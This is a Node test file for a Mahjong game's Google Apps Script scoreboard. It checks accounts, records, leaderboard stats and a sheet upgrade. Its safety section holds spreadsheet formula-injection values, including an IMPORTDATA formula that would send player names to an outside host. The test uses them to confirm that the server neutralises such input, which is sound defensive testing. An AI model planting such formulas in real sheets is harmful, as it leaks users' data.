#!/usr/bin/env node
/* HK Mahjong — tests/scoreboard_gs.test.js
 * Runs server/scoreboard.gs (the Google Apps Script web app) in Node against small fakes of SpreadsheetApp,
 * PropertiesService, LockService, ContentService and Utilities, then drives it through the same JSON requests the
 * game sends (src/ui/online.js): set up the tabs, create accounts, sign in, record wins, hands and games (with
 * retries), and read the leaderboard. Formulas are not evaluated here; they are checked for shape and references.
 * The last part loads version 1 of the script (tests/_fixtures/scoreboard_v1.gs), fills a sheet with it, and checks
 * that version 2 upgrades that sheet without losing anything.
 *   node tests/scoreboard_gs.test.js
 */
'use strict';
var crypto = require('crypto'), path = require('path');
var passes = 0, fails = 0;
function ok(c, label) { if (c) passes++; else { fails++; console.log('FAIL ' + label); } }
var makeServer = require('./_stubs/gas.js').makeServer;

var S = makeServer();
var sandbox = S.sandbox, book = S.book, propsStore = S.props;

function call(body) { return JSON.parse(sandbox.doPost({ postData: { contents: JSON.stringify(body) } }).text); }
function getCall(params) { return JSON.parse(sandbox.doGet({ parameter: params }).text); }
function pw(name, pass) { return crypto.createHash('sha256').update('hkmj:' + name.toLowerCase() + ':' + pass, 'utf8').digest('hex'); }
function sheet(n, b) { return (b || book).getSheetByName(n); }
function col(sh, c) { var out = []; for (var r = 2; r <= sh.getLastRow(); r++) out.push(sh.get(r, c)); return out; }
function rowOf(sh, r, n) { var out = []; for (var c = 1; c <= n; c++) out.push(sh.get(r, c)); return out; }
function colLetter(n) { var s = ''; while (n > 0) { var m = (n - 1) % 26; s = String.fromCharCode(65 + m) + s; n = Math.floor((n - 1) / 26); } return s; }
function extend(a, b) { Object.keys(b || {}).forEach(function (k) { a[k] = b[k]; }); return a; }

// ------------------------------------------------------------------ setup
ok(/ready/.test(sandbox.setup()), 'setup runs');
var names = book.getSheets().map(function (s) { return s.name; });
ok(JSON.stringify(names) === JSON.stringify(['Players', 'Games', 'Wins', 'Hands', 'Stats', 'Leaderboard', 'Hall of Fame']), 'tabs created, Sheet1 removed: ' + names.join(', '));
ok(sheet('Games').get(1, 4) === 'Final score' && sheet('Games').get(1, 12) === 'Computer level' && sheet('Games').get(1, 13) === 'Result', 'Games headers');
ok(sheet('Wins').get(1, 9) === 'Hand IDs' && sheet('Wins').get(1, 12) === 'Computer level', 'Wins headers');
ok(rowOf(sheet('Hands'), 1, 12).join('|') === 'Time|Player|Game ID|Hand no.|Result|Dealt in|Winner|How|Fan|Points|Computer level|Scoring', 'Hands headers');
var ST = sheet('Stats');
ok(ST.get(2, 12) === 'fullFlush' && ST.get(1, 12) === 'Full Flush' && ST.get(1, 40) === 'Chicken Hand', 'Stats has hand names and scoring IDs (L..AN)');
ok(ST.get(1, 41) === 'Games lost' && ST.get(1, 46) === 'Hand win rate' && ST.get(1, 47) === 'Easy games' && ST.get(1, 54) === 'Normal 1st places' &&
  ST.get(1, 64) === 'Hard hands won' && ST.getLastColumn() === 64, 'Stats extra and per-level columns (AO..BL)');
ok(/^=IFERROR\(SORT\(FILTER\(Stats!A3:BL,/.test(sheet('Leaderboard').get(2, 2)) && sheet('Leaderboard').get(1, 65) === 'Hard hands won', 'Leaderboard sorts all Stats columns');
ok(propsStore.schema === '2', 'sheet layout version saved');
ok(sandbox.setup() && book.getSheets().length === 7, 'setup is safe to run twice');
ok(getCall({ action: 'ping' }).ok === true && getCall({ action: 'ping' }).version === 2, 'ping says version 2');

// ------------------------------------------------------------------ accounts
ok(call({ action: 'register', username: 'J', pw: pw('J', 'x') }).ok === false, 'name too short rejected');
ok(call({ action: 'register', username: '<b>x</b>', pw: pw('<b>x</b>', 'x') }).ok === false, 'odd characters rejected');
ok(call({ action: 'register', username: 'Julie', pw: 'nothex' }).ok === false, 'password must arrive hashed');
var r1 = call({ action: 'register', username: '  Julie  ', pw: pw('Julie', 'tea') });
ok(r1.ok && r1.username === 'Julie', 'register Julie');
ok(call({ action: 'register', username: 'julie', pw: pw('julie', 'other') }).ok === false, 'names are unique ignoring case');
ok(call({ action: 'register', username: '阿梅', pw: pw('阿梅', 'dim sum') }).ok === true, 'Chinese names allowed');
ok(call({ action: 'register', username: 'Bel', pw: pw('Bel', 'bel') }).ok === true, 'register Bel');
ok(call({ action: 'login', username: 'Julie', pw: pw('Julie', 'wrong') }).ok === false, 'wrong password rejected');
var li = call({ action: 'login', username: 'JULIE', pw: pw('JULIE', 'tea') });
ok(li.ok && li.username === 'Julie', 'login is case-insensitive and returns the registered spelling');
ok(JSON.stringify(Object.keys(propsStore).filter(function (k) { return /^user:/.test(k); }).sort()) === JSON.stringify(['user:bel', 'user:julie', 'user:阿梅']), 'one Script Property per account');
var stored = JSON.parse(propsStore['user:julie']);
ok(stored.hash !== pw('Julie', 'tea') && stored.salt && stored.hash.length === 64, 'server salts and re-hashes');
var sheetText = book.getSheets().map(function (s) { return JSON.stringify(s.cells); }).join('');
ok(sheetText.indexOf(stored.hash) < 0 && sheetText.indexOf(pw('Julie', 'tea')) < 0, 'no password hash anywhere in the sheet');
ok(JSON.stringify(col(sheet('Players'), 1)) === JSON.stringify(['Julie', '阿梅', 'Bel']), 'Players rows');
ok(col(ST, 1).slice(1).join() === 'Julie,阿梅,Bel', 'one Stats row per player (from row 3)');
ok(ST.get(3, 2) === '=COUNTIF(Games!$B$2:$B,$A3)' && ST.get(5, 12) === '=COUNTIFS(Wins!$B$2:$B,$A5,Wins!$I$2:$I,"*,"&L$2&",*")',
  'Stats formulas reference their own row: ' + ST.get(5, 12));
ok(ST.get(3, 42) === '=COUNTIF(Hands!$B$2:$B,$A3)' && ST.get(3, 46) === '=IF(AP3=0,0,COUNTIFS(Hands!$B$2:$B,$A3,Hands!$E$2:$E,"Win")/AP3)',
  'hands played and hand win rate formulas: ' + ST.get(3, 46));
ok(ST.get(4, 48) === '=COUNTIFS(Games!$B$2:$B,$A4,Games!$E$2:$E,1,Games!$L$2:$L,"Easy")' && ST.get(4, 49) === '=IF(AU4=0,0,AV4/AU4)' &&
  ST.get(4, 64) === '=COUNTIFS(Hands!$B$2:$B,$A4,Hands!$E$2:$E,"Win",Hands!$K$2:$K,"Hard")', 'per-level formulas: ' + ST.get(4, 64));

// ------------------------------------------------------------------ records
var J = { username: 'Julie', pw: pw('Julie', 'tea') }, B = { username: 'Bel', pw: pw('Bel', 'bel') };
function win(who, extra) { return call(extend(extend({ action: 'win' }, who), extra)); }
function hand(who, extra) { return call(extend(extend({ action: 'hand' }, who), extra)); }
function game(who, extra) { return call(extend(extend({ action: 'game' }, who), extra)); }
var FF = [{ id: 'fullFlush', name: 'Full Flush', fan: 7 }, { id: 'selfPick', name: 'Self-Pick', fan: 1 }];
ok(win({ username: 'Julie', pw: pw('Julie', 'nope') }, { gameId: 'g1', handNo: 1, fan: 7 }).ok === false, 'win with a bad password rejected');
ok(win(J, { gameId: 'g1', handNo: 1, fan: 8, points: 64, source: 'self', items: FF, aiLevel: 'normal' }).ok, 'record a win');
ok(win(J, { gameId: 'g1', handNo: 1, fan: 8, points: 64, source: 'self', items: [] }).duplicate === true, 'same win sent twice is stored once');
ok(win(J, { gameId: 'g1', handNo: 4, fan: 13, points: 256, source: 'discard', items: [{ id: 'thirteenOrphans', name: 'Thirteen Orphans', fan: 13 }], aiLevel: 'normal' }).ok, 'record a limit hand');
ok(win(B, { gameId: 'g9', handNo: 2, fan: 0, points: 4, source: 'discard', chicken: true, items: [], aiLevel: 'hard' }).ok, 'record a chicken hand');
ok(win(B, { gameId: 'g9', handNo: 3, fan: 7, points: 48, source: 'self', items: [{ id: 'fullFlush', name: 'Full Flush', fan: 7 }], aiLevel: 'hard' }).ok, 'Bel full flush');
ok(win(B, { gameId: 'g9', handNo: 5, fan: 7, points: 48, source: 'discard', items: [{ id: 'fullFlush', name: 'Full Flush', fan: 7 }], aiLevel: 'Hard' }).ok, 'Bel second full flush');
var W = sheet('Wins');
ok(W.getLastRow() === 6, 'five win rows (+ header): ' + W.getLastRow());
ok(W.get(2, 7) === 'Self-pick' && W.get(2, 9) === ',fullFlush,selfPick,' && W.get(3, 10) === 'Yes' && W.get(4, 11) === 'Yes' && W.get(4, 9) === ',chicken,',
  'win columns: how, hand IDs, limit, chicken');
ok(W.get(2, 8) === 'Full Flush 7, Self-Pick 1', 'scoring text');
ok(col(W, 12).join() === 'Normal,Normal,Hard,Hard,Hard', 'computer level on every win, spelled the same way');

// every hand: wins, losses and draws
ok(hand(J, { gameId: 'g1', handNo: 1, result: 'win', source: 'self', fan: 8, points: 64, items: FF, aiLevel: 'normal' }).ok, 'hand: win');
ok(hand(J, { gameId: 'g1', handNo: 2, result: 'loss', dealtIn: true, winner: 'Pat (computer)', source: 'discard', fan: 5, points: -32,
  items: [{ name: 'Mixed Flush', fan: 3 }, { name: 'Dragon Pung', fan: 2 }], aiLevel: 'normal' }).ok, 'hand: loss, dealt in');
ok(hand(J, { gameId: 'g1', handNo: 3, result: 'draw', dealtIn: true, winner: 'x', source: 'self', fan: 9, points: 0, items: FF, aiLevel: 'normal' }).ok, 'hand: draw');
ok(hand(J, { gameId: 'g1', handNo: 4, result: 'win', source: 'discard', fan: 13, points: 256, aiLevel: 'normal' }).ok, 'hand: limit win');
ok(hand(J, { gameId: 'g1', handNo: 5, result: 'loss', dealtIn: false, winner: 'Bel (computer)', source: 'self', fan: 3, points: -8, aiLevel: 'normal' }).ok, 'hand: loss on a self-pick');
ok(hand(J, { gameId: 'g1', handNo: 2, result: 'loss', points: -32 }).duplicate === true, 'same hand sent twice is stored once');
ok(hand(J, { gameId: 'g1', handNo: 6, result: 'maybe' }).ok === false, 'unknown hand result rejected');
ok(hand({ username: 'Julie', pw: pw('Julie', 'nope') }, { gameId: 'g1', handNo: 7, result: 'win' }).auth === false, 'hand with a bad password rejected');
ok(hand(B, { gameId: 'g9', handNo: 1, result: 'loss', dealtIn: true, winner: 'Julie (computer)', source: 'discard', fan: 4, points: -16, aiLevel: 'hard' }).ok &&
  hand(B, { gameId: 'g9', handNo: 2, result: 'win', source: 'discard', fan: 0, points: 4, aiLevel: 'hard' }).ok, 'Bel hands');
var H = sheet('Hands');
ok(H.getLastRow() === 8, 'seven hand rows (+ header): ' + H.getLastRow());
ok(rowOf(H, 2, 12).slice(1).join('|') === 'Julie|g1|1|Win||Julie|Self-pick|8|64|Normal|Full Flush 7, Self-Pick 1', 'win row: ' + rowOf(H, 2, 12).slice(1).join('|'));
ok(rowOf(H, 3, 12).slice(1).join('|') === 'Julie|g1|2|Loss|Yes|Pat (computer)|Discard|5|-32|Normal|Mixed Flush 3, Dragon Pung 2', 'loss row: ' + rowOf(H, 3, 12).slice(1).join('|'));
ok(rowOf(H, 4, 12).slice(1).join('|') === 'Julie|g1|3|Draw|||||0|Normal|', 'draw row keeps no winner, Fan or scoring: ' + rowOf(H, 4, 12).slice(1).join('|'));
ok(H.get(6, 6) === '' && H.get(6, 7) === 'Bel (computer)' && H.get(6, 8) === 'Self-pick', 'a loss without dealing in');

ok(game(J, { gameId: 'g1', score: 410, place: 1, hands: 9, handsWon: 2, selfPicks: 1, biggestFan: 13, minFan: 3, rounds: 4, aiLevel: 'normal' }).ok, 'record a game');
ok(game(J, { gameId: 'g1', score: 410, place: 1 }).duplicate === true, 'same game sent twice is stored once');
ok(game(B, { gameId: 'g9', score: -120, place: 3, hands: 7, handsWon: 3, aiLevel: 'hard' }).ok, 'Bel game');
ok(game(B, { gameId: 'g10', score: 90, place: 2, hands: 6, handsWon: 0, aiLevel: 'easy' }).ok, 'Bel second game');
var G = sheet('Games');
ok(G.get(2, 12) === 'Normal' && G.get(2, 13) === 'Win' && G.get(3, 12) === 'Hard' && G.get(3, 13) === 'Loss', 'games: level and Win / Loss');
ok(game(J, { gameId: 'g2', score: 1e12, place: 9, aiLevel: 'impossible' }).ok && G.get(5, 4) === 1000000 && G.get(5, 5) === 4 && G.get(5, 12) === '' && G.get(5, 13) === 'Loss',
  'numbers are clamped, unknown levels left blank');

// ------------------------------------------------------------------ leaderboard
var lb = getCall({ action: 'leaderboard', player: 'julie' });
ok(lb.ok && lb.version === 2 && lb.levels.length === 3, 'leaderboard ok');
var top = lb.players[0];
ok(top.name === 'Julie' && top.games === 2 && top.firsts === 1 && top.gamesLost === 1 && top.totalScore === 1000410 && top.handsWon === 2 &&
  top.biggestFan === 13 && top.limitHands === 1, 'Julie stats: ' + JSON.stringify(top).slice(0, 300));
ok(top.handsPlayed === 5 && top.handWins === 2 && top.handsLost === 2 && top.handsDrawn === 1 && top.dealtIn === 1 && top.handWinRate === 0.4, 'Julie hands W-L-D');
var jn = top.byLevel.normal, je = top.byLevel.easy;
ok(jn.games === 1 && jn.firsts === 1 && jn.totalScore === 410 && jn.handsPlayed === 5 && jn.handWins === 2 && jn.handsWon === 2 && je.games === 0 && je.handsPlayed === 0,
  'Julie on Normal: ' + JSON.stringify(jn));
var bel = lb.players.filter(function (p) { return p.name === 'Bel'; })[0];
ok(bel.games === 2 && bel.totalScore === -30 && bel.bestGame === 90 && bel.avgScore === -15 && bel.hands.fullFlush === 2 && bel.chickens === 1 && bel.selfPicks === 1,
  'Bel stats: ' + JSON.stringify(bel).slice(0, 300));
ok(bel.byLevel.hard.games === 1 && bel.byLevel.hard.totalScore === -120 && bel.byLevel.hard.handsWon === 3 && bel.byLevel.hard.handsPlayed === 2 &&
  bel.byLevel.easy.games === 1 && bel.byLevel.easy.totalScore === 90 && bel.byLevel.easy.bestGame === 90 && bel.byLevel.easy.firsts === 0, 'Bel by level');
var mei = lb.players.filter(function (p) { return p.name === '阿梅'; })[0];
ok(mei && mei.games === 0 && mei.bestGame === 0 && mei.winRate === 0 && mei.handWinRate === 0 && mei.byLevel.hard.games === 0, 'a player with no games yet still listed');
ok(lb.players.map(function (p) { return p.rank; }).join() === '1,2,3', 'ranks');
var rec = {}; lb.records.forEach(function (r) { rec[r.award] = r; });
ok(rec['Biggest hand'].player === 'Julie' && rec['Biggest hand'].value === 13 && /Thirteen Orphans/.test(rec['Biggest hand'].detail), 'Hall of Fame: biggest hand');
ok(rec['Chicken champion'].player === 'Bel', 'Hall of Fame: chicken champion');
ok(rec['Most games won on Normal'].player === 'Julie' && rec['Most games won on Normal'].value === 1 && !rec['Most games won on Hard'] && !rec['Most games won on Easy'],
  'Hall of Fame: games won by level (only levels someone has won)');
var champ = {}; lb.champions.forEach(function (c) { champ[c.id] = c; });
ok(champ.fullFlush.player === 'Bel' && champ.fullFlush.count === 2 && champ.fullFlush.first === 'Julie', 'Full Flush: champion Bel, first Julie');
ok(champ.thirteenOrphans.first === 'Julie' && !champ.nineGates, 'only hands someone has won are listed');
ok(lb.recent.length === 5 && lb.recent[0].player === 'Bel', 'recent wins, newest first');
ok(lb.myGames.length === 2 && lb.myGames[1].level === 'Normal' && lb.myGames[1].result === 'Win' && lb.myGames[0].result === 'Loss', 'my games with level and result');
ok(lb.myWins.length === 2 && lb.myWins[0].level === 'Normal', 'my wins with level');
ok(lb.myHands.length === 5 && lb.myHands[0].handNo === 5 && lb.myHands[3].result === 'Loss' && lb.myHands[3].dealtIn === true && lb.myHands[3].scoring === 'Mixed Flush 3, Dragon Pung 2',
  'my hands, newest first, with how the winning hand scored');
ok(Array.isArray(lb.hands) && lb.hands.length === 29, 'hand list sent with names');

// ------------------------------------------------------------------ formulas: balanced and pointing at real tabs
function badFormulas(b) {
  var bad = [];
  b.getSheets().forEach(function (s) {
    Object.keys(s.cells).forEach(function (k) {
      var v = s.cells[k];
      if (typeof v !== 'string' || v[0] !== '=') return;
      var depth = 0, q = false;
      for (var i = 0; i < v.length; i++) { var ch = v[i]; if (ch === '"') q = !q; else if (!q && ch === '(') depth++; else if (!q && ch === ')') depth--; if (depth < 0) break; }
      var refs = (v.match(/([A-Za-z ]+)!/g) || []).map(function (x) { return x.replace(/^[^A-Za-z]*/, '').slice(0, -1).trim(); });
      var unknown = refs.filter(function (n) { return !b.getSheetByName(n); });
      if (depth !== 0 || q || unknown.length) bad.push(s.name + '!' + k + ' ' + v + (unknown.length ? ' unknown tabs ' + unknown : ''));
    });
  });
  return bad;
}
var bad = badFormulas(book);
ok(bad.length === 0, 'formulas balanced and reference existing tabs' + (bad.length ? ': ' + bad.slice(0, 3).join(' | ') : ''));
var hall = sheet('Hall of Fame');
ok(hall.get(1, 1) === 'Record' && hall.get(6, 1) === 'Most games won on Easy' && hall.get(8, 1) === 'Most games won on Hard' && hall.get(12, 1) === 'Chicken champion',
  'Hall of Fame records in order');
ok(/Stats!AV3:AV/.test(hall.get(6, 2)) && /Stats!BB3:BB/.test(hall.get(7, 2)) && /Stats!BH3:BH/.test(hall.get(8, 2)), 'level records use the level 1st-place columns');
ok(/Stats!AN3:AN/.test(hall.get(12, 2)), 'chicken champion uses the Chicken Hand column (AN)');
ok(hall.get(14, 1) === 'Hand' && hall.get(15, 2) === 'fullFlush' && /MATCH\("\*,"&\$B15&",\*",Wins!\$I\$2:\$I,0\)/.test(hall.get(15, 5)),
  'Hall of Fame hand rows find the first winner by scoring ID');

// ------------------------------------------------------------------ owner tools, safety
ok(/reset/i.test(sandbox.resetPassword('bel')) && !propsStore['user:bel'], 'reset password');
ok(call({ action: 'register', username: 'Bel', pw: pw('Bel', 'new') }).ok, 'Bel registers again after a reset');
ok(getCall({ action: 'leaderboard' }).players.filter(function (p) { return p.name === 'Bel'; })[0].hands.fullFlush === 2, 'records kept after a reset');
ok(col(sheet('Players'), 1).filter(function (n) { return n === 'Bel'; }).length === 1, 'no duplicate Players row after a reset');
sandbox.resetPassword('Bel');
var again = call({ action: 'register', username: 'bEL', pw: pw('bEL', 'third') });
ok(again.ok && again.username === 'Bel' && col(sheet('Players'), 1).filter(function (n) { return /^bel$/i.test(n); }).length === 1,
  'coming back after a reset keeps the name as it is on the sheet');
ok(call({ action: 'login', username: 'bel', pw: pw('bel', 'third') }).ok, 'and the new password works');
ok(call({ action: 'win', username: 'Julie', pw: pw('Julie', 'tea'), gameId: '=1+1', handNo: 9, fan: 3, points: 16,
  items: [{ id: 'x', name: '=IMPORTDATA("https://example.com/?"&Players!A2)', fan: 3 }] }).ok, 'win with formula-looking text accepted');
var wl = sheet('Wins'), wr = wl.getLastRow();
ok(String(wl.get(wr, 3)).charAt(0) !== '=' && String(wl.get(wr, 8)).charAt(0) !== '=' && /^IMPORTDATA/.test(wl.get(wr, 8)),
  'leading = removed from game ID and scoring text');
ok(hand(J, { gameId: 'g3', handNo: 1, result: 'loss', winner: '=HYPERLINK("x")', items: [{ name: '+cmd', fan: 1 }] }).ok &&
  H.get(H.getLastRow(), 7) === 'HYPERLINK("x")' && H.get(H.getLastRow(), 12) === 'cmd 1', 'hand text is made safe too');
ok(propsStore.sheetId === '1TestSheetId', 'setup remembers the sheet ID');
S.opts.noActive = true; sandbox.bookCache = null;
ok(getCall({ action: 'leaderboard' }).players.length > 0, 'works without an active spreadsheet (opens the saved ID)');
var savedId = propsStore.sheetId; delete propsStore.sheetId; sandbox.bookCache = null;
var noSetup = getCall({ action: 'leaderboard' });
ok(noSetup.ok === false && /run "setup"/.test(noSetup.error), 'clear message if setup was never run: ' + noSetup.error);
propsStore.sheetId = savedId; S.opts.noActive = false; sandbox.bookCache = null;
var nope = call({ action: 'nope' });
ok(nope.ok === false && nope.unknown === true && JSON.parse(sandbox.doPost({ postData: { contents: 'not json' } }).text).ok === false, 'bad requests answered with ok:false');

// ------------------------------------------------------------------ upgrading the live sheet made by version 1
// Version 1 wrote its 40-column Stats tab into a new tab, which Google makes with only 26 columns, so its setup stopped
// half way. The raw tabs still filled up after a failed first sign-up. This rebuilds that state, then lets version 2 fix it.
var V1 = makeServer({ file: path.join(__dirname, '_fixtures', 'scoreboard_v1.gs') });
function v1(body) { return JSON.parse(V1.sandbox.doPost({ postData: { contents: JSON.stringify(body) } }).text); }
var threw = ''; try { V1.sandbox.setup(); } catch (e) { threw = e.message; }
ok(/outside the dimensions/.test(threw), 'v1 setup stops on a new Google Sheet, as it did live: ' + threw);
V1.opts.noActive = true; V1.sandbox.bookCache = null;   // from here on these are web-app requests
var P = { username: 'Pat', pw: pw('Pat', 'pat') };
var firstTry = v1(extend({ action: 'register' }, J));
ok(firstTry.ok === false && /outside the dimensions/.test(firstTry.error), 'v1: the first sign-up fails too');
v1(extend({ action: 'register' }, J));
ok(v1(extend({ action: 'login' }, J)).ok, 'v1: signing in works after that');
v1(extend({ action: 'register' }, P));
ok(v1(extend({ action: 'login' }, P)).ok, 'v1: second player');
v1(extend({ action: 'win', gameId: 'a1', handNo: 2, fan: 8, points: 64, source: 'self', items: FF }, J));
v1(extend({ action: 'win', gameId: 'a1', handNo: 5, fan: 3, points: 16, source: 'discard', items: [{ id: 'allTriplets', name: 'All Triplets', fan: 3 }] }, J));
v1(extend({ action: 'win', gameId: 'a2', handNo: 1, fan: 4, points: 32, source: 'discard', items: [{ id: 'sevenPairs', name: 'Seven Pairs', fan: 4 }] }, J));   // game not finished
v1(extend({ action: 'game', gameId: 'a1', score: 250, place: 1, hands: 8, handsWon: 2, aiLevel: 'hard' }, J));
v1(extend({ action: 'game', gameId: 'p1', score: -40, place: 3, hands: 8, handsWon: 0, aiLevel: 'easy' }, P));
var oldBook = V1.book;
var oS = sheet('Stats', oldBook);
ok(!sheet('Hands', oldBook) && sheet('Wins', oldBook).getLastRow() === 4 && sheet('Games', oldBook).get(2, 12) === 'hard' &&
  oS.get(1, 1) === '' && oS.get(3, 1) === 'Julie' && oS.get(3, 2) === '' && sheet('Leaderboard', oldBook).getLastRow() === 0,
  'v1 state: records saved, but Stats has no headers or formulas and the Leaderboard tab is empty');
var winsRowsBefore = sheet('Wins', oldBook).getLastRow();
var keep = {}; Object.keys(V1.props).forEach(function (k) { keep[k] = V1.props[k]; });

// the owner pastes version 2 and publishes a new version; the first request from the game does the upgrade
var V2 = makeServer({ book: oldBook, props: V1.props, noActive: true });
function v2(body) { return JSON.parse(V2.sandbox.doPost({ postData: { contents: JSON.stringify(body) } }).text); }
var up = JSON.parse(V2.sandbox.doGet({ parameter: { action: 'leaderboard', player: 'Julie' } }).text);
ok(up.ok, 'v2 answers right away on the v1 sheet: ' + (up.error || ''));
ok(V1.props.schema === '2', 'sheet marked as upgraded');
ok(oldBook.getSheets().map(function (s) { return s.name; }).join() === 'Players,Games,Wins,Stats,Leaderboard,Hall of Fame,Hands', 'Hands tab added, nothing removed: ' +
  oldBook.getSheets().map(function (s) { return s.name; }).join());
var oG = sheet('Games', oldBook), oW = sheet('Wins', oldBook), oH = sheet('Hands', oldBook);
ok(oG.get(1, 13) === 'Result' && oG.get(2, 12) === 'Hard' && oG.get(2, 13) === 'Win' && oG.get(3, 12) === 'Easy' && oG.get(3, 13) === 'Loss', 'games: level spelled out, result filled in');
ok(oG.get(2, 4) === 250 && oG.get(3, 4) === -40 && oG.getLastRow() === 3, 'game scores untouched');
ok(oW.get(1, 12) === 'Computer level' && col(oW, 12).join() === 'Hard,Hard,' && oW.getLastRow() === winsRowsBefore, 'wins get the level of their finished game');
ok(oH.getLastRow() === 4 && col(oH, 5).join() === 'Win,Win,Win' && oH.get(2, 12) === 'Full Flush 7, Self-Pick 1' && col(oH, 11).join() === 'Hard,Hard,',
  'every saved win also listed as a hand');
ok(oS.getMaxColumns() >= 64 && oS.get(1, 1) === 'Player' && oS.get(1, 64) === 'Hard hands won' && oS.get(2, 12) === 'fullFlush', 'Stats headers built');
ok(col(oS, 1).slice(1).join() === 'Julie,Pat' && oS.get(3, 2) === '=COUNTIF(Games!$B$2:$B,$A3)' && /Hands!\$K\$2:\$K,"Hard"/.test(oS.get(4, 64)),
  'a Stats row with formulas for every player: ' + col(oS, 1).join());
var oB = sheet('Leaderboard', oldBook);
ok(oB.getMaxColumns() >= 65 && oB.get(1, 2) === 'Player' && /Stats!A3:BL,/.test(oB.get(2, 2)), 'Leaderboard built');
ok(sheet('Hall of Fame', oldBook).get(14, 1) === 'Hand' && sheet('Hall of Fame', oldBook).get(11, 2).indexOf('Stats!I3:I') > 0, 'Hall of Fame rebuilt in the new layout');
var uj = up.players.filter(function (p) { return p.name === 'Julie'; })[0];
ok(uj.byLevel.hard.games === 1 && uj.byLevel.hard.firsts === 1 && uj.byLevel.hard.handsPlayed === 2 && uj.handsPlayed === 3 && uj.handWins === 3,
  'old records count by level: ' + JSON.stringify(uj.byLevel.hard));
ok(Object.keys(keep).filter(function (k) { return /^user:/.test(k); }).length === 2 &&
  Object.keys(keep).every(function (k) { return V1.props[k] === keep[k]; }), 'accounts and passwords unchanged');
ok(v2(extend({ action: 'hand', gameId: 'a3', handNo: 1, result: 'loss', winner: 'Bel (computer)', points: -8, aiLevel: 'normal' }, J)).ok, 'v2 records on the upgraded sheet');
ok(oH.getLastRow() === 5, 'new hand added');
ok(v2(extend({ action: 'register', username: 'Mei', pw: pw('Mei', 'mei') })).ok && col(oS, 1).slice(1).join() === 'Julie,Pat,Mei' && /COUNTIF/.test(oS.get(5, 2)),
  'a new player gets a full Stats row');
V2.sandbox.bookCache = null; V2.sandbox.tabsChecked = false; V2.opts.noActive = false;
V2.sandbox.setup();
ok(oH.getLastRow() === 5 && oW.getLastRow() === winsRowsBefore && JSON.stringify(col(oG, 13)) === '["Win","Loss"]' && col(oS, 1).length === 4,
  'running setup again changes nothing');
var bad2 = badFormulas(oldBook);
ok(bad2.length === 0, 'upgraded formulas balanced' + (bad2.length ? ': ' + bad2.slice(0, 2).join(' | ') : ''));
// a deleted Stats tab comes back with everyone's rows on the next request
oldBook.deleteSheet(oS); V2.sandbox.tabsChecked = false;
ok(v2(extend({ action: 'login' }, J)).ok && col(sheet('Stats', oldBook), 1).slice(1).join() === 'Julie,Pat,Mei', 'deleted Stats tab rebuilt with every player');

console.log('scoreboard_gs.test: ' + passes + ' passed, ' + fails + ' failed.');
process.exit(fails ? 1 : 0);
